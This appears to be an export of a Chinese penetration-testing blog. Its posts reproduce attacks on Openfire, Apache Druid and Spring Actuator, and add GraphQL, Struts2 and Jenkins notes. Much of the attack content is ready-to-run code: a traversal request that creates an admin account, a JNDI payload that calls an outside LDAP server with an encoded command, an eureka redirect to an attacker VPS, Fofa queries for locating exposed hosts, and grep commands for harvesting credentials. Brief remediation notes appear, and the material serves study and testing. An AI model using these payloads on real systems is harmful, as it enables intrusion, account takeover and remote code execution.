/api/graphql</span><br><span class="line">  </span><br><span class="line">  # 用户名</span><br><span class="line">  &#123;&quot;query&quot;:&quot;&#123;users&#123;edges&#123;node&#123;username,email&#125;&#125;&#125;&#125;&quot;&#125;</span><br><span class="line">  </span><br><span class="line">  # 用户名，邮箱，头像信息</span><br><span class="line">  &#123;&quot;query&quot;:&quot;&#123;\nusers &#123;\nedges &#123;\n  node &#123;\n    username\n    email\n    avatarUrl\n    status &#123;\n      emoji\n      message\n      messageHtml\n     &#125;\n    &#125;\n   &#125;\n  &#125;\n &#125;&quot;,&quot;variables&quot;:null,&quot;operationName&quot;:null&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p><a href="https://fgtbnc.github.io/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">若依漏洞 | Khaz (fgtbnc.github.io)</a></p><p>遇到的问题</p><ul><li>用户凭证（工具是cookie，但是遇到的很多都是JWT的）</li><li>定时任务处的过滤</li></ul><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><a href="https://fgtbnc.github.io/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞 | Khaz (fgtbnc.github.io)</a></p><h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><ul><li><p>Isecure Center综合安防管理平台任意文件上传</p><p><img src="/../images/iSecure-Center.png" alt="iSecure-Center"></p></li><li><p>iVMS-5000,iVMS-8700任意文件上传</p><p><img src="/../images/image-20230826111722216.png" alt="image-20230826111722216"></p></li></ul><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p><code>OGNL</code>表达式注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 关键函数</span><br><span class="line">Ognl.getValue()</span><br></pre></td></tr></table></figure><p>测试OGNL表达式<code>$&#123;233*233&#125;</code>，如果页面回显<code>233*233</code>的结果，则存在OGNL表达式解析。</p><table><thead><tr><th align="center">漏洞名称</th><th align="center">注入点</th><th align="center">影响版本</th></tr></thead><tbody><tr><td align="center">S2-061</td><td align="center"></td><td align="center">2.0.0 -  2.5.25</td></tr><tr><td align="center">S2-045</td><td align="center">Content-Type</td><td align="center">2.3.5 - 2.3.31， 2.5 -  2.5.10</td></tr><tr><td align="center">S2-046</td><td align="center">文件上传的filename值位置，并需要使用<code>\x00</code>截断</td><td align="center">2.3.5 - 2.3.31， 2.5 -  2.5.10</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005</span><br><span class="line">S2-008</span><br><span class="line">S2-009</span><br><span class="line">S2-013</span><br><span class="line">S2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)</span><br><span class="line">S2-019</span><br><span class="line">S2-020</span><br><span class="line">S2-devmode</span><br><span class="line">S2-032</span><br><span class="line">S2-033</span><br><span class="line">S2-037</span><br><span class="line">S2-045</span><br><span class="line">S2-046</span><br><span class="line">S2-048</span><br><span class="line">S2-052</span><br><span class="line">S2-053</span><br><span class="line">S2-057</span><br></pre></td></tr></table></figure><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><blockquote><p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，<strong>一般与Tomcat或 Jetty绑定使用</strong>。</p></blockquote><p><a href="https://forum.butian.net/share/504">奇安信攻防社区-Jboss渗透合集</a></p><p><img src="/../images/image-20230830142620222.png" alt="image-20230830142620222"></p><p><img src="/../images/image-20230830142653114.png" alt="image-20230830142653114"></p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><blockquote><p>Winodws下可以装个wls2</p><p>算了，老实开虚拟机吧😅。wsl2需要开启hyper-V，但是安卓模拟器又要关闭hyper-v，而且VM15.5以下的版本也需要关闭hyper-V。。</p></blockquote><ul><li><p>图标哈希指纹提取</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://hunter.qianxin.com/favicon.ico | md5sum</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hunter</span></span><br><span class="line">web.icon=&quot;md5&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">360</span></span><br><span class="line">favicon:&quot;MD5&quot;</span><br></pre></td></tr></table></figure></li><li><p>敏感信息查找</p><ul><li><p>提取url</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -EHirn &quot;http:|https:&quot; 1  | cut -d &#x27;:&#x27; -f 2- &gt; result.txt</span><br></pre></td></tr></table></figure></li><li><p>提取账密</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -EHirn &quot;username|password&quot; 1  | cut -d &#x27;:&#x27; -f 2- &gt; up.txt</span><br></pre></td></tr></table></figure></li><li><p>key</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -EHirn &quot;密钥|accesskey|api_key|apikey|secret|corpid|corpsecret|cloud|oss&quot; 1  &gt; key.txt</span><br></pre></td></tr></table></figure></li></ul></li><li><p>文件下载</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录遍历漏洞，目录名默认为host</span></span><br><span class="line">wget -r --no-pare  url /mnt/c/Users/khaz/Downloads</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量下载,比如存储桶遍历</span></span><br><span class="line">wget -i urls.txt -P Download/</span><br></pre></td></tr></table></figure></li><li><p>排序并去重</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sort filename | uniq</span><br></pre></td></tr></table></figure></li></ul><h2 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">置空</span><br><span class="line">删除</span><br><span class="line">Null</span><br><span class="line">None</span><br><span class="line">%  模糊查询，可能直接全部查出来了</span><br></pre></td></tr></table></figure><h2 id="请求包转换为脚本请求"><a href="#请求包转换为脚本请求" class="headerlink" title="请求包转换为脚本请求"></a>请求包转换为脚本请求</h2><p>burp：copy as curl commad</p><p><a href="https://curlconverter.com/">Convert curl commands to code</a></p><p><img src="/../images/image-20230827111636995.png" alt="image-20230827111636995"></p><h2 id="文件，目录扫描"><a href="#文件，目录扫描" class="headerlink" title="文件，目录扫描"></a>文件，目录扫描</h2><p>域名的一部分，公司名称的缩写，目录名（目录为&#x2F;cn，备份文件为&#x2F;cn&#x2F;cn.rar）</p><h1 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h1><p><img src="/../images/image-20230906203458435.png" alt="image-20230906203458435"></p><p><img src="/../images/image-20230906203603258.png" alt="image-20230906203603258"></p><p><img src="/../images/image-20230906203609555.png" alt="image-20230906203609555"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Openfire身份认证绕过+插件Getshell漏洞复现</title>
      <link href="/2023/06/25/openfire/"/>
      <url>/2023/06/25/openfire/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>​Openfire的管理控制台是一个基于 Web 的应用程序，被发现可以使用UTF-16字符来绕过路径穿越的防护，从而以路径遍历的方式绕过权限校验。成功利用后，未经身份验证的用户可以访问 Openfire 管理控制台中的后台页面。</p><p>​同时由于Openfire管理控制台的后台提供了安装插件的功能，所以攻击者可以通过安装恶意插件达成远程代码执行的效果</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p> 3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p><p> 4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p>vulhub</p></li><li><p>Fofa语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Openfire&quot;   49,485 条匹配结果 ( 23,657 条独立IP )</span><br></pre></td></tr></table></figure></li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>工具</p><p><a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go run main.go -u http://openfire.com:9090</span><br><span class="line"></span><br><span class="line">go run main.go -l url.txt -t 20</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625225708359.png" alt="image-20230625225708359"></p><p>手动</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&amp;username=hackme&amp;name=&amp;email=&amp;password=hackme&amp;passwordConfirm=hackme&amp;isadmin=on&amp;create=Create+User</span><br></pre></td></tr></table></figure><p>创建了一个用户名与密码均为hackme的用户</p><h3 id="插件getshell"><a href="#插件getshell" class="headerlink" title="插件getshell"></a>插件getshell</h3><p>使用增加的用户进入后台</p><p><img src="/../images/image-20230625224759596.png" alt="image-20230625224759596"></p><p>上传插件<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar%EF%BC%8C%E6%9D%A5%E5%88%B0server">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar，来到server</a> settings</p><p><img src="/../images/image-20230625224848522.png" alt="image-20230625224848522"></p><p>输入密码后</p><p><img src="/../images/image-20230625224924825.png" alt="image-20230625224924825"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>手动</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625230442265.png" alt="image-20230625230442265"></p><p>nuclei</p><p><img src="/../images/image-20230625231354247.png" alt="image-20230625231354247"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级版本至<strong>4.6.8或4.7.5及以上</strong></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid RCE漏洞复现(QVD-2023-9629)</title>
      <link href="/2023/06/24/Apache%20Druid/"/>
      <url>/2023/06/24/Apache%20Druid/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka">kafka</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194">CVE-2023-25194</a></p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h2 id="Fofa语法"><a href="#Fofa语法" class="headerlink" title="Fofa语法"></a>Fofa语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Druid&quot;         866 条</span><br><span class="line">js_name=&quot;console-config.js&quot;   850 条</span><br></pre></td></tr></table></figure><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Kafka clients中存在一处<strong>JNDI注入</strong>漏洞。如果攻击者在连接的时候可以控制属性<code>sasl.jaas.config</code>的值为<code>com.sun.security.auth.module.JndiLoginModule</code>，则可以发起JNDI连接，进而导致JNDI注入漏洞，<strong>执行任意命令</strong>。</p><h2 id="影响版本和软件"><a href="#影响版本和软件" class="headerlink" title="影响版本和软件"></a>影响版本和软件</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><p>使用Apache Kafka的软件<strong>Apache Druid</strong></p><blockquote><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p><p>该应用的历史漏洞：</p><h5 id="Apache-Druid-JDBC反序列化代码执行漏洞（CVE-2021-26919）"><a href="#Apache-Druid-JDBC反序列化代码执行漏洞（CVE-2021-26919）" class="headerlink" title="Apache Druid JDBC反序列化代码执行漏洞（CVE-2021-26919）"></a>Apache Druid JDBC反序列化代码执行漏洞（CVE-2021-26919）</h5><h5 id="Apache-Druid-log4j-远程代码执行漏洞"><a href="#Apache-Druid-log4j-远程代码执行漏洞" class="headerlink" title="Apache Druid log4j 远程代码执行漏洞"></a>Apache Druid log4j 远程代码执行漏洞</h5><p><strong>未授权访问漏洞</strong></p></blockquote><p><strong>影响版本0.19.0 &lt;&#x3D; Apache Druid &lt;&#x3D; 25.0.0</strong></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>开启ldap服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.1-SNAPSHOT.jar -i 124.220.192.120</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155944899.png" alt="image-20230624155944899"></p><p>发送payload，替换其中的LDAP URL</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;spec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;ioConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;consumerProperties&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:6666&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;topic&quot;</span>:<span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;inputFormat&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;columns&quot;</span>:[</span></span><br><span class="line"><span class="language-swift">                    <span class="string">&quot;raw&quot;</span></span></span><br><span class="line"><span class="language-swift">                ]</span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;dataSchema&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;timestampSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dimensionsSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift"></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;granularitySpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;tuningConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span></span></span><br><span class="line"><span class="language-swift">        &#125;</span></span><br><span class="line"><span class="language-swift">    &#125;,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;samplerConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span></span></span><br><span class="line"><span class="language-swift">    &#125;</span></span><br><span class="line"><span class="language-swift">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155828710.png" alt="image-20230624155828710"></p><p><img src="/../images/image-20230624155800506.png" alt="image-20230624155800506"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li><p>为Apache Druid 开启认证配置。</p><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></p></li><li><p>升级版本</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring框架漏洞</title>
      <link href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring概述"><a href="#Spring概述" class="headerlink" title="Spring概述"></a>Spring概述</h2><p>Spring Framework 是一个开源的应用程序框架和 Java 平台的控制容器的反转。由于其强大的功能和易用性，它在行业中被各种程序和系统广泛使用。一些知名产品如 Spring Boot 和 Spring Cloud 都是使用 Spring Framework 开发的。</p><h2 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h2><ul><li><p>如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶<br><img src="/../images/image-20230622113805635.png" alt="image-20230622113805635"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure></li><li><p>如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：</p><p><img src="/../images/image-20230622113724212.png" alt="image-20230622113724212"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="spel表达式"><a href="#spel表达式" class="headerlink" title="spel表达式"></a>spel表达式</h2><p><a href="https://www.wangan.com/p/7fy7f6cf77af4b1a">https://www.wangan.com/p/7fy7f6cf77af4b1a</a></p><h2 id="Spring-Boot-Actuator敏感信息泄露"><a href="#Spring-Boot-Actuator敏感信息泄露" class="headerlink" title="Spring Boot Actuator敏感信息泄露"></a>Spring Boot Actuator敏感信息泄露</h2><h3 id="Actuator概述"><a href="#Actuator概述" class="headerlink" title="Actuator概述"></a>Actuator概述</h3><p>​Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。</p><p>​其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：</p><p><img src="/../images/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg" alt="v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg"></p><h4 id="版本问题"><a href="#版本问题" class="headerlink" title="版本问题"></a>版本问题</h4><ul><li><p><code>Spring Boot</code> &lt; 1.5：默认未授权访问所有端点、</p></li><li><p><code>Spring Boot</code> &gt;&#x3D; 1.5：默认只允许访问 <code>/health</code> 和 <code>/info</code> 端点，但是此安全性通常被应用程序开发人员禁用了</p></li><li><p><code>Spring Boot</code>2.x相比于1.x版本的端点多了个前缀 <code>/actuator</code>，如<code>/health</code> 变成了<code>/actuator/health</code>。</p></li></ul><h4 id="端点路径"><a href="#端点路径" class="headerlink" title="端点路径"></a>端点路径</h4><p>设置管理端点的路径:</p><p>在1.x版本下，设置语句如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.context-path =/manage</span><br></pre></td></tr></table></figure><p>此时端点的访问方式就变为了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在2.x版本，设置语句如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.base-path=/manage</span><br></pre></td></tr></table></figure><p>此时端点的访问方式就变为了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /actuator被manage代替</span><br><span class="line"></span><br><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>有些人可能喜欢将其命名为<code>monitor</code>,所以知道这个特点，我们可以适当丰富下自己的字典。</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="x2F-mappings"><a href="#x2F-mappings" class="headerlink" title="&#x2F;mappings"></a>&#x2F;mappings</h4><p>泄露路由信息</p><p><img src="/../images/image-20230623215633942.png" alt="image-20230623215633942"></p><h4 id="x2F-trace，-x2F-httptrace"><a href="#x2F-trace，-x2F-httptrace" class="headerlink" title="&#x2F;trace，&#x2F;httptrace"></a>&#x2F;trace，&#x2F;httptrace</h4><ul><li><p>获取基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</p></li><li><p>存在的隐患：如果存在登录用户的操作请求，可以伪造cookie进行登录。</p></li></ul><p><img src="/../images/image-20230623215702605.png" alt="image-20230623215702605"></p><p>注意：这个只是显示最近的100条数据，但是我们可以写脚本来持续监控。</p><h4 id="x2F-env"><a href="#x2F-env" class="headerlink" title="&#x2F;env"></a>&#x2F;env</h4><ul><li><p>获取全部环境属性</p></li><li><p>存在的隐患</p><ul><li><p>可能会泄露数据库账号密码等敏感信息,但是泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式</p></li><li><p><strong>eureka xstream  RCE</strong></p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p><img src="/../images/image-20230711220504085.png" alt="image-20230711220504085"></p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>修改要执行的命令后</p><p><img src="/../images/image-20230623213306180.png" alt="image-20230623213306180"></p><p>起一个恶意eureka server </p><p><img src="/../images/image-20230623213230483.png" alt="image-20230623213230483"></p><p>设置eureka.client.serviceUrl.defaultZone 属性为恶意的外部 eureka server URL 地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><p>{“name”:”eureka.client.serviceUrl.defaultZone”,”value”:”<a href="http://your-vps-ip/example&quot;%7D">http://your-vps-ip/example&quot;}</a><br>    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    ![image-20230623213048736](../images/image-20230623213048736.png)</span><br><span class="line">    </span><br><span class="line">    refresh 触发目标机器请求远程 URL，提前架设的  eureka server 就会返回恶意的 payload</span><br><span class="line">    </span><br><span class="line">    ```php</span><br><span class="line">    # spring 1.x</span><br><span class="line">    </span><br><span class="line">    POST /refresh</span><br><span class="line">    Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line">    # spring 2.x</span><br><span class="line">    </span><br><span class="line">    POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure></p><pre><code>![image-20230623212943456](../images/image-20230623212943456.png)从而触发 XStream 反序列化，造成 RCE 漏洞![image-20230623212922680](../images/image-20230623212922680.png)</code></pre><p>​    </p><pre><code>执行完命令后记得恢复，如果不恢复的话，那么命令就会一直执行，系统也会一直报错，将eureka.client.serviceUrl.defaultZone属性设置为原来的即可。</code></pre><p>​    </p><h4 id="x2F-heapdump"><a href="#x2F-heapdump" class="headerlink" title="&#x2F;heapdump"></a>&#x2F;heapdump</h4><blockquote><p>Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照<br>Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息<br>通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文,accesskey等</p></blockquote><p>访问后会下载heapdump</p><p><img src="/../images/image-20230623215844567.png" alt="image-20230623215844567"></p><h5 id="heapdump分析工具"><a href="#heapdump分析工具" class="headerlink" title="heapdump分析工具"></a>heapdump分析工具</h5><ul><li><p><a href="https://github.com/wyzxxz/heapdump_tool">wyzxxz&#x2F;heapdump_tool: heapdump敏感信息查询工具，例如查找 spring heapdump中的密码明文，AK,SK等</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于JAVA自带的jhat，通过jhat解析heapdump文件</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230711221037329.png" alt="image-20230711221037329"></p></li><li><p><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar 